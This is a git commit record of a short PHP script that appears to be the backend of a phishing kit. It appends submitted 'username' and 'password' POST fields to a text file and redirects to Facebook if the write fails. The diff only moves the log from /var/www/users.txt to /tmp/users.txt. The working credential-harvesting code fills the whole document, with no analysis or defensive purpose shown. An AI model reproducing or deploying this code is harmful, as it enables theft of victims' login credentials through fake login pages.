3afc8f7a9fd8f97e51598db34794ceb8922a4fa6
Cameron Poe <cameron@zay.li>
2016-07-01 05:41:50 -0500

    Update script.php

--- script.php
+++ script.php
@@ -1,7 +1,7 @@
 <?php
 if(isset($_POST['field1']) && isset($_POST['field2'])) {
     $data = 'username: ' . $_POST['field1'] . ' password: ' . $_POST['field2'] . "\n";
-    $ret = file_put_contents('/var/www/users.txt', $data, FILE_APPEND | LOCK_EX);
+    $ret = file_put_contents('/tmp/users.txt', $data, FILE_APPEND | LOCK_EX);
     if($ret === false) {
         header( 'Location: https://www.facebook.com/' );
     }
